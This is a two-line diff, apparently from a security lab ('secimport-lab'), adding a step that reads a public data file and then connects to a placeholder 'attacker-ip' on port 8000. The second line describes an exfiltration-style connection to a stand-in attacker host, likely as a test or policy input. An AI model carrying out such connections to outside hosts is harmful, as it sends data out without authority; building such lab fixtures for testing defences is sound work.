@@ -1,0 +1,2 @@
+READ secimport-lab/data/public.txt
+CONNECT attacker-ip:8000
